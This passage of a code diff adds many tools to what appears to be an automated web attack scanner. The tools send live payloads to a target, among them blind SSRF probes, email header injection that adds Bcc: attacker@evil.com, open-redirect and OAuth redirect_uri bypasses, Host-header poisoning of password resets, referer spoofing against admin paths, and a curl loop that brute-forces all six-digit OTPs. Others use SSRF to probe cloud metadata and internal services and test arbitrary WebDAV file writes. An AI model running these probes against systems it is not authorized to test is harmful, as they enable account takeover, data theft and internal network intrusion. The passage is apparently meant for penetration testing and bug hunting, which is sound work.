+                        warn("  ViewState without MAC — deserialization exploit possible")
+                        issues.append({"type":"viewstate_no_mac","url":src_url})
+                except Exception: pass
+        if issues:
+            profile.findings.append(Finding(
+                id="F-DESER-001", title="Insecure Deserialization Indicators",
+                severity="HIGH", cwe="CWE-502", cvss=8.1,
+                description=f"Serialized objects found: {[i['type'] for i in issues]}",
+                evidence="\n".join(f"{i['type']}: {i['url']}" for i in issues[:5]),
+                reproduction="# Test with ysoserial (Java) or phpggc (PHP) gadget chains",
+                poc_curl=f"# Manual: send crafted serialized payload to {profile.url}",
+                category="Deserialization",
+                remediation="Avoid deserializing untrusted data. Use HMAC to sign serialized state. Use JSON instead."
+            ))
+        return profile
+
+# ── TOOL 49: BLIND SSRF OOB PAYLOAD GENERATOR  (SKILL-59) ──
+class BlindSSRFGenerator:
+    """Generates OOB SSRF payloads using DNS-based detection patterns."""
+    SSRF_PARAMS = ["url","fetch","src","href","link","endpoint","webhook","image_url",
+                   "img_url","proxy","resource","target","dest","redirect","callback","feed"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("BLIND-SSRF-49: OOB SSRF payload generation for manual verification")
+        base = profile.url.rstrip("/")
+        # Generate interaction URL placeholders (for Burp Collaborator / interactsh)
+        host = profile.host
+        oob_domain = f"YOUR_OOB_DOMAIN.burpcollaborator.net"
+        payloads_generated = []
+        # Probe params from JS/Wayback
+        for param in list(set(profile.ssrf_params + self.SSRF_PARAMS))[:10]:
+            oob_url = f"http://{param}.{host}.{oob_domain}/"
+            test_url = f"{base}?{param}={urllib.parse.quote(oob_url)}"
+            payloads_generated.append({"param":param,"payload":oob_url,"test_url":test_url})
+        # Also probe all discovered API endpoints
+        for endpoint in profile.api_endpoints[:10]:
+            ep_url = base + endpoint if endpoint.startswith("/") else endpoint
+            for param in self.SSRF_PARAMS[:5]:
+                full = f"{ep_url}?{param}=http://{param}.oob.{oob_domain}/"
+                payloads_generated.append({"param":param,"payload":full,"test_url":full})
+        if payloads_generated:
+            poc_lines = "\n".join(f"curl -sk '{p['test_url']}'" for p in payloads_generated[:10])
+            profile.findings.append(Finding(
+                id="F-BSSRF-001", title="Blind SSRF Attack Surface — OOB Payloads Generated",
+                severity="INFO", cwe="CWE-918", cvss=0.0,
+                description=f"Generated {len(payloads_generated)} OOB SSRF payloads for manual verification.",
+                evidence="\n".join(f"{p['param']}: {p['test_url'][:80]}" for p in payloads_generated[:10]),
+                reproduction=f"# Replace {oob_domain} with your Burp Collaborator/interactsh domain:\n{poc_lines}",
+                poc_curl=f"curl -sk '{payloads_generated[0]['test_url']}'",
+                category="SSRF",
+                remediation="Use Burp Collaborator or https://app.interactsh.com to detect DNS callbacks."
+            ))
+        return profile
+
+# ── TOOL 50: EMAIL/SMTP HEADER INJECTION  (SKILL-60) ───────
+class EmailHeaderInjection:
+    INJECT_PAYLOADS = [
+        "test@test.com\r\nBcc: attacker@evil.com",
+        "test@test.com\nBcc: attacker@evil.com",
+        "test%0aBcc:attacker@evil.com",
+        "test%0d%0aBcc:attacker@evil.com",
+        "test@test.com\r\nContent-Type: text/html\r\n<script>alert(1)</script>",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("EMAIL-50: SMTP header injection via contact/feedback forms")
+        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
+        email_forms = re.findall(
+            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
+            html_body, re.I | re.S)
+        email_endpoints = ["/contact","/feedback","/support/new","/api/contact",
+                           "/api/feedback","/help/new","/api/email","/subscribe"]
+        confirmed = []
+        for path in email_endpoints[:5]:
+            url = profile.url.rstrip("/") + path
+            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
+                method="POST",
+                data=urllib.parse.urlencode({
+                    "email": self.INJECT_PAYLOADS[0],
+                    "name": "Test", "message": "Test", "subject": "Test"
+                }).encode(),
+                headers_extra={"Content-Type":"application/x-www-form-urlencoded"})
+            if code in [200,201,202] and re.search(r'sent|success|thank|received', body, re.I):
+                high(f"  EMAIL INJECTION candidate at {path} — email accepted with CRLF payload!")
+                confirmed.append({"path":path,"url":url})
+        if confirmed:
+            profile.findings.append(Finding(
+                id="F-EMAIL-001", title="Email/SMTP Header Injection",
+                severity="MEDIUM", cwe="CWE-93", cvss=5.3,
+                description=f"Email header injection possible at {[c['path'] for c in confirmed]}",
+                evidence="\n".join(f"{c['url']}: accepted CRLF in email field" for c in confirmed),
+                reproduction="\n".join(
+                    f"curl -sk -X POST '{c['url']}' -d 'email=test%40test.com%0aBcc%3Aattacker%40evil.com&message=test'"
+                    for c in confirmed[:2]),
+                poc_curl=f"curl -sk -X POST '{confirmed[0]['url']}' -d 'email=test%40test.com%0aBcc%3Aattacker%40evil.com&message=test'",
+                category="Email Injection",
+                remediation="Sanitize email fields. Reject CRLF characters. Use email sending libraries with strict validation."
+            ))
+        return profile
+
+# ── TOOL 51: JSONP ENDPOINT DISCOVERY  (SKILL-61) ──────────
+class JSONPDiscovery:
+    """JSONP can bypass CSP if the domain is whitelisted."""
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("JSONP-51: JSONP endpoint discovery (CSP bypass vector)")
+        base = profile.url.rstrip("/")
+        found = []
+        jsonp_params = ["callback","cb","jsonp","json_callback","call","fn","func","handler","wrapper"]
+        test_paths = profile.api_endpoints[:20] + ["/api","/api/v1","/api/data","/api/users"]
+        for ep in test_paths[:15]:
+            ep_url = base+ep if ep.startswith("/") else ep
+            for param in jsonp_params[:4]:
+                test_url = f"{ep_url}?{param}=APEXTEST"
+                code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
+                ct = hdrs.get("content-type","")
+                if code == 200 and ("APEXTEST(" in body or body.startswith("APEXTEST(")):
+                    high(f"  JSONP ENDPOINT: {ep_url} (param: {param})")
+                    found.append({"url":test_url,"param":param,"ep":ep_url})
+                elif code == 200 and "javascript" in ct.lower() and "APEXTEST" in body:
+                    warn(f"  JSONP candidate: {ep_url} (JS content-type, callback reflected)")
+                    found.append({"url":test_url,"param":param,"ep":ep_url})
+        if found:
+            csp = (profile.security_headers.get("headers",{})
+                   .get("content-security-policy",{}).get("value",""))
+            csp_bypass = any(profile.host in csp or f.get("ep","") in csp for f in found)
+            profile.findings.append(Finding(
+                id="F-JSONP-001", title="JSONP Endpoint — Potential CSP Bypass",
+                severity="HIGH" if csp_bypass else "MEDIUM",
+                cwe="CWE-942", cvss=7.4 if csp_bypass else 5.4,
+                description=f"JSONP endpoints discovered. If whitelisted in CSP, allows XSS bypass.",
+                evidence="\n".join(f"{f['ep']}?{f['param']}=callback" for f in found),
+                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in found[:3]),
+                poc_curl=f"curl -sk '{found[0]['url']}'",
+                category="JSONP/CSP",
+                remediation="Replace JSONP with CORS. If JSONP required, validate callback name strictly (alphanumeric only)."
+            ))
+        return profile
+
+# ── TOOL 52: REFERER-BASED ACL BYPASS  (SKILL-62) ──────────
+class RefererACLBypass:
+    SPOOFED_REFERERS = [
+        f"https://{{host}}/admin",
+        f"https://{{host}}/",
+        "https://localhost/admin",
+        "https://127.0.0.1/admin",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("REFERER-52: Referer-based access control bypass")
+        base = profile.url.rstrip("/"); host = profile.host
+        protected_paths = ["/admin","/admin/users","/admin/config",
+                           "/api/admin","/internal","/management"]
+        found = []
+        for path in protected_paths:
+            url = base + path
+            baseline_code, _, _ = _fetch(url, cfg.user_agent, cfg.timeout)
+            if baseline_code not in [401,403]: continue
+            for ref_tpl in self.SPOOFED_REFERERS:
+                referer = ref_tpl.replace("{host}", host)
+                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
+                    headers_extra={"Referer": referer, "Origin": f"https://{host}"})
+                if code == 200:
+                    high(f"  REFERER BYPASS: {path} accessible via Referer: {referer}")
+                    found.append({"path":path,"referer":referer,"code":code})
+                    break
+        if found:
+            profile.findings.append(Finding(
+                id="F-REF-001", title="Referer-Based Access Control Bypass",
+                severity="HIGH", cwe="CWE-807", cvss=8.1,
+                description=f"Protected paths accessible by spoofing Referer: {[f['path'] for f in found]}",
+                evidence="\n".join(f"{f['path']}: Referer={f['referer']} → {f['code']}" for f in found),
+                reproduction="\n".join(f"curl -sk -H 'Referer: {f['referer']}' '{base+f['path']}'" for f in found[:2]),
+                poc_curl=f"curl -sk -H 'Referer: https://{host}/admin' '{base+found[0]['path']}'",
+                category="Access Control",
+                remediation="Never use Referer for authorization. Implement proper session-based auth."
+            ))
+        return profile
+
+# ── TOOL 53: 2FA/OTP ENDPOINT FINDER  (SKILL-63) ───────────
+class TwoFAEndpointFinder:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("2FA-53: 2FA/OTP endpoint discovery + brute-force surface")
+        base = profile.url.rstrip("/")
+        mfa_paths = ["/api/otp","/api/2fa","/api/mfa","/api/verify",
+                     "/api/auth/otp","/api/auth/verify","/api/totp",
+                     "/verify","/2fa","/mfa","/otp"]
+        found = []
+        for path in mfa_paths:
+            code, body, hdrs = _fetch(base+path, cfg.user_agent, cfg.timeout,
+                method="POST", data=b'{"otp":"123456","code":"123456"}',
+                headers_extra={"Content-Type":"application/json"})
+            if code in [200,400,401,422]:
+                found.append({"path":path,"code":code})
+                ok(f"  2FA endpoint: {path} [{code}]")
+                # Check rate limiting on 2FA
+                codes_rl = []
+                for i in range(5):
+                    test_code, _, _ = _fetch(base+path, cfg.user_agent, 3,
+                        method="POST",
+                        data=json.dumps({"otp":str(100000+i),"code":str(100000+i)}).encode(),
+                        headers_extra={"Content-Type":"application/json"})
+                    codes_rl.append(test_code)
+                    time.sleep(0.1)
+                if 429 not in codes_rl:
+                    high(f"  NO RATE LIMIT on 2FA endpoint {path}! Brute-force 000000-999999 possible!")
+                    profile.findings.append(Finding(
+                        id=f"F-2FA-{len(profile.findings):03d}",
+                        title="2FA/OTP Brute-Force — No Rate Limiting",
+                        severity="CRITICAL", cwe="CWE-307", cvss=9.8,
+                        description=f"OTP endpoint {path} has no rate limiting — 1M combinations in minutes.",
+                        evidence=f"5 rapid requests returned: {codes_rl}",
+                        reproduction=f"for i in $(seq 0 999999); do printf -v otp '%06d' $i; curl -sk -X POST '{base+path}' -H 'Content-Type: application/json' -d '{{\"otp\":\"'$otp'\"}}'; done",
+                        poc_curl=f"curl -sk -X POST '{base+path}' -H 'Content-Type: application/json' -d '{{\"otp\":\"000000\"}}'",
+                        category="2FA/MFA",
+                        remediation="Rate-limit OTP attempts to 5/hour per account. Lock after 10 failures. Use time-based OTP with short window."
+                    ))
+        return profile
+
+# ── TOOL 54: ERROR PAGE INTELLIGENCE  (SKILL-64) ───────────
+class ErrorPageIntelligence:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("ERRPAGE-54: Error page version/stack trace intelligence harvesting")
+        base = profile.url.rstrip("/")
+        trigger_urls = [
+            base+"/'\"<>{}|\\^`",  # special chars
+            base+"/nonexistent_apex_test_xyz_123",
+            base+"/api/v1/../../../../etc/passwd",
+            base+"?" + "a="*1000,  # long query
+        ]
+        findings_list = []
+        for url in trigger_urls:
+            try:
+                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
+                if code in [400,404,500,503]:
+                    # Stack trace
+                    if re.search(r'at\s+[\w\.]+\([\w\.]+\.java:\d+\)|Traceback.*most recent|' +
+                                 r'Stack trace:|at System\.Web\.|Microsoft\.AspNet|' +
+                                 r'TypeError:|ReferenceError:', body, re.S):
+                        high(f"  STACK TRACE EXPOSED: HTTP {code} at {url[:60]}")
+                        findings_list.append({"type":"stack_trace","url":url,"code":code,"preview":body[:200]})
+                    # Version disclosure
+                    for pat, label in [
+                        (r'Apache/(\d+\.\d+\.\d+)', "Apache"),
+                        (r'nginx/(\d+\.\d+\.\d+)', "Nginx"),
+                        (r'PHP/(\d+\.\d+\.\d+)', "PHP"),
+                        (r'ASP\.NET version (\d+\.\d+)', "ASP.NET"),
+                        (r'Python/(\d+\.\d+\.\d+)', "Python"),
+                        (r'Express (\d+\.\d+\.\d+)', "Express"),
+                        (r'Tomcat/(\d+\.\d+\.\d+)', "Tomcat"),
+                    ]:
+                        m = re.search(pat, body + str(hdrs), re.I)
+                        if m:
+                            warn(f"  VERSION DISCLOSURE: {label} {m.group(1)} in error page")
+                            findings_list.append({"type":f"version_{label.lower()}","version":m.group(1),"url":url})
+            except Exception: pass
+        if findings_list:
+            stack = [f for f in findings_list if f["type"]=="stack_trace"]
+            vers  = [f for f in findings_list if f["type"].startswith("version_")]
+            profile.findings.append(Finding(
+                id="F-ERR-001", title="Sensitive Error Page Information Disclosure",
+                severity="MEDIUM" if not stack else "HIGH",
+                cwe="CWE-209", cvss=5.3,
+                description=f"Error pages expose: {len(stack)} stack traces, {len(vers)} version strings.",
+                evidence="\n".join(f"{f['type']}: {f.get('preview','')[:100] or f.get('version','')}" for f in findings_list[:5]),
+                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in findings_list[:3]),
+                poc_curl=f"curl -sk '{findings_list[0]['url']}'",
+                category="Information Disclosure",
+                remediation="Configure custom error pages. Disable stack traces in production. Hide version headers."
+            ))
+        return profile
+
+# ── TOOL 55: OPEN REDIRECT CHAIN  (SKILL-65) ───────────────
+class OpenRedirectChain:
+    """Multi-hop redirect chain to arbitrary external domain."""
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("REDIR-55: Open redirect chain + OAuth redirect_uri abuse")
+        base = profile.url.rstrip("/")
+        redirect_params = ["next","return","returnurl","redirect","goto","url","back","continue","redir"]
+        chain_payloads = [
+            "//evil.com", "////evil.com", "/\\evil.com",
+            "https://evil.com%23." + profile.host,
+            "https://evil.com%3F." + profile.host,
+            "https://" + profile.host + "@evil.com",
+            "https://evil.com/" + profile.host,
+        ]
+        found = []
+        for param in redirect_params:
+            for payload in chain_payloads:
+                url = f"{base}?{param}={urllib.parse.quote(payload, safe='')}"
+                code, _, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
+                loc = hdrs.get("location","")
+                if "evil.com" in loc or (code in [301,302,307] and loc and profile.host not in loc):
+                    high(f"  OPEN REDIRECT CHAIN: ?{param}={payload} → {loc}")
+                    found.append({"param":param,"payload":payload,"location":loc,"url":url})
+        # OAuth redirect_uri bypass
+        for auth_path in ["/oauth/authorize","/api/oauth","/auth/oauth2"]:
+            for payload in chain_payloads[:3]:
+                test_url = f"{base}{auth_path}?response_type=code&client_id=test&redirect_uri={urllib.parse.quote(payload)}"
+                code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
+                if code in [301,302] and "evil.com" in hdrs.get("location",""):
+                    high(f"  OAUTH REDIRECT_URI BYPASS: {auth_path}")
+                    found.append({"param":"redirect_uri","payload":payload,"location":hdrs.get("location",""),"url":test_url})
+        if found and len(found) > len(profile.open_redirects):
+            profile.open_redirects.extend([f["url"] for f in found])
+            profile.findings.append(Finding(
+                id="F-REDIR-CHAIN-001", title="Open Redirect Chain — Multi-Vector",
+                severity="MEDIUM", cwe="CWE-601", cvss=6.1,
+                description=f"Open redirect bypasses: {list(set(f['payload'] for f in found))}",
+                evidence="\n".join(f"{f['param']}={f['payload']} → {f['location']}" for f in found[:5]),
+                reproduction="\n".join(f"curl -sk -I '{f['url']}'" for f in found[:3]),
+                poc_curl=f"curl -sk -I '{found[0]['url']}'",
+                category="Open Redirect",
+                remediation="Validate redirect destinations against strict allowlist. Never use user input as redirect URL."
+            ))
+        return profile
+
+# ── TOOL 56: HTML INJECTION / DANGLING MARKUP  (SKILL-66) ──
+class HTMLInjectionScanner:
+    HTML_PAYLOADS = [
+        ("<b>HTMLTEST</b>", "<b>HTMLTEST</b>"),
+        ("<h1>HTMLTEST", "<h1>HTMLTEST"),
+        ('<a href="https://evil.com">click</a>', ">click</a>"),
+        ('<img src="https://evil.com/pixel.gif"', 'evil.com/pixel.gif'),
+        ('<form action="https://evil.com">', 'evil.com'),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("HTMLINJ-56: HTML injection + dangling markup detection")
+        base = profile.url.rstrip("/")
+        params = list(set(profile.parameters[:8] + ["name","message","search","q","input","text","comment"]))
+        found = []
+        for param in params[:8]:
+            for payload, indicator in self.HTML_PAYLOADS:
+                test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
+                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
+                # Reflected unencoded?
+                if indicator in body and html.escape(indicator) not in body:
+                    sev = "HIGH" if "form" in payload or "img" in payload else "MEDIUM"
+                    high(f"  HTML INJECTION: param '{param}' payload reflected unencoded ({sev})")
+                    found.append({"param":param,"payload":payload,"url":test_url,"sev":sev})
+                    break
+        if found:
+            dangling = [f for f in found if "img" in f["payload"] or "form" in f["payload"]]
+            profile.findings.append(Finding(
+                id="F-HTML-001", title="HTML Injection / Dangling Markup",
+                severity="HIGH" if dangling else "MEDIUM",
+                cwe="CWE-80", cvss=6.1,
+                description=f"HTML injected unencoded in params: {[f['param'] for f in found]}",
+                evidence="\n".join(f"{f['param']}: {f['payload'][:60]}" for f in found[:5]),
+                reproduction="\n".join(f"curl -sk '{f['url']}'" for f in found[:3]),
+                poc_curl=f"curl -sk '{found[0]['url']}'",
+                category="HTML Injection",
+                remediation="HTML-encode all user-controlled output. Implement strict CSP. Use a templating engine with auto-escaping."
+            ))
+        return profile
+
+# ── TOOL 57: CORS PREFLIGHT ANALYZER  (SKILL-67) ───────────
+class CORSPreflightAnalyzer:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CORS-PRE-57: CORS preflight OPTIONS analysis")
+        issues = []
+        for ep in [profile.url] + [profile.url.rstrip("/")+p for p in profile.api_endpoints[:5]]:
+            code, _, hdrs = _fetch(ep, cfg.user_agent, cfg.timeout, method="OPTIONS",
+                headers_extra={"Origin": f"https://evil.com",
+                               "Access-Control-Request-Method": "DELETE",
+                               "Access-Control-Request-Headers": "Authorization,X-Custom-Header"})
+            acao = hdrs.get("access-control-allow-origin","")
+            acam = hdrs.get("access-control-allow-methods","")
+            acah = hdrs.get("access-control-allow-headers","")
+            acac = hdrs.get("access-control-allow-credentials","")
+            acma = hdrs.get("access-control-max-age","")
+            if acao == "*" or acao == "https://evil.com":
+                high(f"  CORS PREFLIGHT OPEN: {ep} — ACAO={acao} ACAM={acam}")
+                issues.append({"url":ep,"acao":acao,"acam":acam,"acac":acac})
+            if "DELETE" in acam.upper() or "PUT" in acam.upper():
+                warn(f"  CORS allows dangerous methods: {acam} at {ep}")
+            if acma and int(acma or 0) > 86400:
+                warn(f"  CORS max-age very long: {acma}s — poisoned preflight cached!")
+        if issues:
+            profile.findings.append(Finding(
+                id="F-CORS-PRE-001", title="CORS Preflight Misconfiguration",
+                severity="HIGH", cwe="CWE-942", cvss=7.4,
+                description=f"Preflight allows cross-origin requests from evil.com.",
+                evidence="\n".join(f"{i['url']}: ACAO={i['acao']} ACAM={i['acam']}" for i in issues),
+                reproduction=f"curl -sk -X OPTIONS '{issues[0]['url']}' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: DELETE' -I",
+                poc_curl=f"curl -sk -X OPTIONS '{issues[0]['url']}' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: DELETE' -I",
+                category="CORS",
+                remediation="Validate Origin in preflight. Only allow safe methods (GET, POST) cross-origin unless explicitly required."
+            ))
+        return profile
+
+# ── TOOL 58: INSECURE PASSWORD RESET  (SKILL-68) ───────────
+class PasswordResetAnalyzer:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("PWRESET-58: Insecure password reset flow analysis")
+        base = profile.url.rstrip("/")
+        reset_paths = ["/api/password/reset","/api/forgot-password","/forgot-password",
+                       "/api/auth/reset","/auth/forgot","/api/v1/password/reset",
+                       "/password-reset","/reset","/api/reset-password"]
+        found = []
+        for path in reset_paths:
+            url = base + path
+            # Test with host header injection
+            code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
+                method="POST",
+                data=json.dumps({"email":"victim@example.com"}).encode(),
+                headers_extra={"Content-Type":"application/json",
+                               "Host": "evil.com",
+                               "X-Forwarded-Host": "evil.com"})
+            if code in [200,201,202]:
+                if re.search(r'sent|email|link|password|reset|check', body, re.I):
+                    high(f"  PASSWORD RESET: {path} accepts requests with poisoned Host/X-Forwarded-Host!")
+                    found.append({"path":path,"url":url,"type":"host_poisoning"})
+            # Test token predictability — request 2 tokens quickly
+            tokens = []
+            for _ in range(2):
+                tc, tb, _ = _fetch(url, cfg.user_agent, cfg.timeout,
+                    method="POST",
+                    data=json.dumps({"email":"test@test.com"}).encode(),
+                    headers_extra={"Content-Type":"application/json"})
+                token_match = re.search(r'token["\s:=]+([a-zA-Z0-9]{6,32})', tb, re.I)
+                if token_match: tokens.append(token_match.group(1))
+                time.sleep(0.1)
+            if len(tokens) == 2 and tokens[0] == tokens[1]:
+                high(f"  PASSWORD RESET TOKEN REUSE: same token generated twice at {path}!")
+                found.append({"path":path,"url":url,"type":"token_reuse","tokens":tokens})
+            elif len(tokens) == 2:
+                # Check if tokens share prefix (low entropy)
+                common_prefix = 0
+                for a,b in zip(tokens[0],tokens[1]):
+                    if a==b: common_prefix+=1
+                    else: break
+                if common_prefix > len(tokens[0])//2:
+                    warn(f"  PASSWORD RESET: tokens share long prefix ({common_prefix}/{len(tokens[0])}) — low entropy?")
+        if found:
+            profile.findings.append(Finding(
+                id="F-PWRESET-001", title="Insecure Password Reset Flow",
+                severity="HIGH" if any(f["type"]=="host_poisoning" for f in found) else "MEDIUM",
+                cwe="CWE-640", cvss=8.1,
+                description=f"Password reset issues: {[f['type'] for f in found]}",
+                evidence="\n".join(f"{f['type']}: {f['url']}" for f in found),
+                reproduction=f"curl -sk -X POST '{found[0]['url']}' -H 'X-Forwarded-Host: evil.com' -H 'Content-Type: application/json' -d '{{\"email\":\"victim@target.com\"}}'",
+                poc_curl=f"curl -sk -X POST '{found[0]['url']}' -H 'X-Forwarded-Host: evil.com' -H 'Content-Type: application/json' -d '{{\"email\":\"victim@{profile.host}\"}}'",
+                category="Password Reset",
+                remediation="Bind reset tokens to IP+User-Agent. Ignore Host override headers. Use cryptographically random tokens (256-bit)."
+            ))
+        return profile
+
+# ── TOOL 59: WEBDAV MISCONFIGURATION  (SKILL-69) ───────────
+class WebDAVScanner:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("WEBDAV-59: WebDAV misconfiguration (PROPFIND, PUT, MOVE)")
+        base = profile.url.rstrip("/")
+        issues = []
+        # PROPFIND test
+        propfind_body = b'<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>'
+        code, body, hdrs = _fetch(base+"/", cfg.user_agent, cfg.timeout,
+            method="PROPFIND", data=propfind_body,
+            headers_extra={"Content-Type":"application/xml","Depth":"1"})
+        if code == 207 and "multistatus" in body.lower():
+            high(f"  WEBDAV PROPFIND: Returns 207 Multi-Status — directory listing possible!")
+            issues.append({"method":"PROPFIND","code":207,"detail":"directory listing"})
+        # PUT test — try to upload a test file
+        test_content = b"APEX_HUNTER WebDAV test"
+        put_code, put_body, _ = _fetch(base+"/apex_webdav_test.txt", cfg.user_agent, cfg.timeout,
+            method="PUT", data=test_content,
+            headers_extra={"Content-Type":"text/plain"})
+        if put_code in [200,201,204]:
+            high(f"  WEBDAV PUT: File uploaded to /apex_webdav_test.txt — arbitrary write!")
+            issues.append({"method":"PUT","code":put_code,"detail":"arbitrary file write"})
+            # Clean up
+            _fetch(base+"/apex_webdav_test.txt", cfg.user_agent, cfg.timeout, method="DELETE")
+        if issues:
+            profile.findings.append(Finding(
+                id="F-WEBDAV-001", title="WebDAV Misconfiguration",
+                severity="CRITICAL" if any(i["method"]=="PUT" for i in issues) else "HIGH",
+                cwe="CWE-749", cvss=9.8 if any(i["method"]=="PUT" for i in issues) else 7.5,
+                description=f"WebDAV enabled: {[i['method'] for i in issues]}",
+                evidence="\n".join(f"{i['method']}: HTTP {i['code']} — {i['detail']}" for i in issues),
+                reproduction=f"curl -sk -X PROPFIND '{base}/' -H 'Depth: 1' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><D:propfind xmlns:D=\"DAV:\"><D:allprop/></D:propfind>'",
+                poc_curl=f"curl -sk -X PROPFIND '{base}/' -H 'Depth: 1'",
+                category="WebDAV",
+                remediation="Disable WebDAV unless required. Restrict PUT/DELETE to authenticated users."
+            ))
+        return profile
+
+# ── TOOL 60: CONTENT-TYPE CONFUSION  (SKILL-70) ────────────
+class ContentTypeConfusion:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CTCONF-60: Content-type confusion attack")
+        base = profile.url.rstrip("/")
+        issues = []
+        # Test API endpoints that expect JSON but also accept text/html
+        for ep in (profile.api_endpoints[:10] or ["/api"]):
+            url = base+ep if ep.startswith("/") else ep
+            test_payload = b'{"test":"<script>alert(1)</script>"}'
+            for ct in ["text/html","text/plain","application/x-www-form-urlencoded","text/xml"]:
+                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
+                    method="POST", data=test_payload,
+                    headers_extra={"Content-Type":ct,"Accept":"application/json"})
+                resp_ct = hdrs.get("content-type","").lower()
+                # If JSON API returns HTML content-type when we send HTML content-type
+                if code in [200,201] and "html" in resp_ct and ct=="text/html":
+                    warn(f"  CT CONFUSION: {ep} mirrors Content-Type — XSS amplification possible")
+                    issues.append({"ep":ep,"sent_ct":ct,"resp_ct":resp_ct})
+                # If JSON API reflects input as HTML without encoding
+                if code==200 and "text/html" in resp_ct and "<script>" in body:
+                    high(f"  REFLECTED XSS via Content-Type confusion at {ep}!")
+                    issues.append({"ep":ep,"sent_ct":ct,"resp_ct":resp_ct,"xss":True})
+        if issues:
+            xss_issues = [i for i in issues if i.get("xss")]
+            profile.findings.append(Finding(
+                id="F-CT-001", title="Content-Type Confusion Attack",
+                severity="HIGH" if xss_issues else "MEDIUM",
+                cwe="CWE-116", cvss=7.4 if xss_issues else 5.3,
+                description=f"API reflects Content-Type from request, enabling type confusion.",
+                evidence="\n".join(f"{i['ep']}: sent {i['sent_ct']} → resp {i['resp_ct']}" for i in issues[:5]),
+                reproduction="\n".join(f"curl -sk -X POST '{base+i['ep']}' -H 'Content-Type: text/html' -d '<script>alert(1)</script>'" for i in issues[:2]),
+                poc_curl=f"curl -sk -X POST '{base+(issues[0]['ep'])}' -H 'Content-Type: text/html' -d '<script>alert(1)</script>'",
+                category="Content-Type",
+                remediation="Set explicit Content-Type in all responses. Never mirror request Content-Type."
+            ))
+        return profile
+
+# ── TOOL 61: INTERNAL SERVICE DISCOVERY VIA SSRF  (SKILL-71) ─
+class InternalServiceDiscovery:
+    """Uses SSRF params to map internal services (non-exploiting scan)."""
+    INTERNAL_SERVICES = [
+        ("169.254.169.254",80,"AWS/Azure/GCP metadata"),
+        ("localhost",6379,"Redis"),("127.0.0.1",6379,"Redis"),
+        ("localhost",27017,"MongoDB"),("127.0.0.1",27017,"MongoDB"),
+        ("localhost",9200,"Elasticsearch"),("127.0.0.1",9200,"Elasticsearch"),
+        ("localhost",8080,"Internal HTTP"),("127.0.0.1",8080,"Internal HTTP"),
+        ("localhost",3306,"MySQL"),("127.0.0.1",5432,"PostgreSQL"),
+        ("localhost",11211,"Memcached"),("127.0.0.1",2375,"Docker API"),
+        ("localhost",9090,"Prometheus"),("127.0.0.1",8500,"Consul"),
+        ("localhost",4001,"etcd"),("127.0.0.1",2379,"etcd"),
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("INTERNALSVC-61: Internal service map via SSRF candidates")
+        if not profile.ssrf_params:
+            info("  No SSRF params found — skipping internal service scan")
+            return profile
+        base = profile.url.rstrip("/")
+        param = profile.ssrf_params[0]
+        reachable = []
+        for host_int, port, label in self.INTERNAL_SERVICES:
+            ssrf_url = f"http://{host_int}:{port}/"
+            test_url = f"{base}?{param}={urllib.parse.quote(ssrf_url)}"
+            t0 = time.time()
+            code, body, _ = _fetch(test_url, cfg.user_agent, 4)
+            elapsed = time.time() - t0
+            if code in [200,400,401,403] or (elapsed < 1.5 and code != 0):
+                warn(f"  INTERNAL SERVICE REACHABLE: {label} ({host_int}:{port}) via SSRF param '{param}'")
+                reachable.append({"host":host_int,"port":port,"label":label,"code":code,"time":round(elapsed,2)})
+        if reachable:
+            profile.findings.append(Finding(
+                id="F-INTNET-001", title="Internal Network Service Discovery via SSRF",
+                severity="CRITICAL", cwe="CWE-918", cvss=9.8,
+                description=f"Internal services reachable: {[r['label'] for r in reachable]}",
+                evidence="\n".join(f"{r['label']} ({r['host']}:{r['port']}): HTTP {r['code']} in {r['time']}s" for r in reachable),
+                reproduction="\n".join(f"curl -sk '{base}?{param}=http://{r['host']}:{r['port']}/'" for r in reachable[:3]),
+                poc_curl=f"curl -sk '{base}?{param}=http://169.254.169.254/latest/meta-data/'",
+                category="SSRF/Internal Network",
+                remediation="Use SSRF protection library. Block RFC1918+metadata IPs at WAF/egress firewall."
+            ))
+        return profile
+
+# ── TOOL 62: MASS SUBDOMAIN LIVE CHECK  (SKILL-72) ─────────
+class SubdomainLiveCheck:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("SUBLIVE-62: Deep subdomain live check + service fingerprinting")
+        all_subs = list(set(profile.subdomains + profile.ct_subdomains))
+        resolver = DNSResolver()
+        live_services = []
+        for sub in all_subs[:40]:
+            ip = resolver.resolve(sub)
+            if ip == "NXDOMAIN": continue
